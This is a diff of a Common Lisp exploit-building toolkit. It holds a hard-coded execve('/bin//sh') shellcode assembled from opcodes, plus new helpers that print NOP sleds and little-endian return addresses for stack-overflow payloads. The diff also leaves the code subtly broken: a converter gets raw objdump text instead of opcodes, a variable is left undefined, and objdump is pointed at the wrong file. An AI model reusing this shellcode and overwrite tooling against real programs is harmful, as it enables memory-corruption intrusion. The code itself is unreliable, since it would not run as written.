@@ -2,10 +2,15 @@
 (require :cl-arrows)
 (require :cl-ppcre)
 (require :str)
+(require :alexandria)
 
 (defpackage :lizard-burger
-  (:use :common-lisp :cl-arrows :cl-ppcre :str))
+  (:use :common-lisp :cl-arrows :cl-ppcre))
+
 (in-package :lizard-burger)
+
+;; ASSEMBLY COMPILER
+;; -----------------
 
 ;; REGEX used to parse the objdump output, line by line.
 (defparameter *objdump-line-parser* "\\s*([0-9a-fA-F]{5,}):\\s+((?:[0-9a-fA-F]{2}\\s)*(?:[0-9a-fA-F]{2}))\\s+(.*)")
@@ -52,19 +57,6 @@
                           (t (format t "Error with token '~A'~%" λ))))
                   repr)))
 
-(defun compile-shellcode ()
-  "Compiles the shellcode within this function, and gets the resulting opcodes."
-  (let ((shellcode '((:xor (:eax :eax))
-                     (:push :eax)
-                     (:push #x68732f2f)
-                     (:push #x6e69622f)
-                     (:mov (:ebx :esp))
-                     (:push :eax)
-                     (:push :ebx)
-                     (:mov (:ecx :esp))
-                     (:mov (:al #xb))
-                     (:int #x80))))
-    (compile-assembly shellcode)))
 
 (defun objdump-output->interesting-lines (output)
   "Takes the objdump output, and returns the lines which contain opcodes."
@@ -90,8 +82,53 @@
   (uiop:run-program '("nasm" "-f" "elf" "shellcode.asm" "-o" "shellcode.o"))
   (uiop:run-program '("ld" "-o" "shellcode.elf" "shellcode.o" "-m" "elf_i386"))
   (let* ((objdump-output (uiop:run-program '("objdump" "-d" "whatever.elf") :output :string))
-         (opcodes-str (str:join ""
-                                (mapcar (lambda (x) (format nil "\\x~A" x))
-                                        (objdump-opcodes objdump-output)))))
+         (opcodes->str objdump-output))
     (format t opcodes-str)))
 
+
+;; Utilities
+;; ---------
+
+(defun opcodes->str (list)
+  (str:join ""
+            (mapcar (lambda (x) (format nil "\\x~X" x)) list)))
+
+(defun nop ()
+  #x90)
+
+(defun repeat (op num)
+  (if (zerop num)
+      nil
+      (cons op
+            (repeat op (1- num)))))
+
+(defvar *endianness* :little)
+
+
+;; External Interface
+;; ------------------
+
+
+(defun compile-shellcode ()
+  "Compiles the shellcode within this function, and gets the resulting opcodes."
+  (let ((shellcode '((:xor (:eax :eax))
+                     (:push :eax)
+                     (:push #x68732f2f)
+                     (:push #x6e69622f)
+                     (:mov (:ebx :esp))
+                     (:push :eax)
+                     (:push :ebx)
+                     (:mov (:ecx :esp))
+                     (:mov (:al #xb))
+                     (:int #x80))))
+    (compile-assembly shellcode)))
+
+(defun address (addr &key (reverse-endianness nil))
+  (if reverse-endianness
+      (reverse (lizard-burger.bytes-operations::number->bytes-list addr 32))
+      (lizard-burger.bytes-operations::number->bytes-list addr 32)))
+
+(defun overwrite-at-offset (offset value)
+  (format t (opcodes->str (alexandria:flatten
+                           (list (repeat #x90 offset)
+                                 (address value :reverse-endianness T))))))
